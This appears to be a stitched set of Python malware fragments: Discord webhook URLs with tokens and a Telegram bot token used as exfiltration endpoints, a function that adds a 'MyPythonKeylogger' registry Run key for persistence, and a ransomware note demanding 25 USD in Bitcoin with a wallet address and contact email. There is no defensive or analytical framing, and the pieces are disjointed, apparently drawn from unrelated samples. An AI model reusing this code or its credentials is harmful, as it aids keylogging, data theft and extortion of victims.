...
config = {
    ...
    'webhook': "https://discord.com/api/webhooks/1363593018678050826/Xkr4B6ob1B2Ui2VEsNFutjDNIdZThGMeX-ZlJtapSzDJ76XV9s-K6XU6fAA_2Gcsyuot",
...
WEBHOOK_URL = 'https://discord.com/api/webhooks/1400153734516051998/VSjxg5--5bbeq_qodP09EkwKh9t0iQlYdMoU_sW8eYf3OJMAsXM7rwLoSKivsJ0d473i'
...
def add_to_startup():
    ...
    try:
        ...
        winreg.SetValueEx(key, "MyPythonKeylogger", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
...
Token       = "7713847240:AAGvQGZIYLvkULwuWaU4KKt6g99E6V6pgDY"   # Our Api Token
NumID       = "7648204757"              # Our User ID
        ...
        Canvas.text(
            (10,10), (r"""
                Your data Is encrypted  In order to Get your
                    > date back Send me (25 USD) in BTC to this Wellt
                    > and then email me for your key abdiggg315@gmail.com
                    > 19jGMQ5fYnwqC5jY7JosJQC7fs4h7oXTau
                    > GoodLuck :)
                    > ~ Abdi74811. """), 
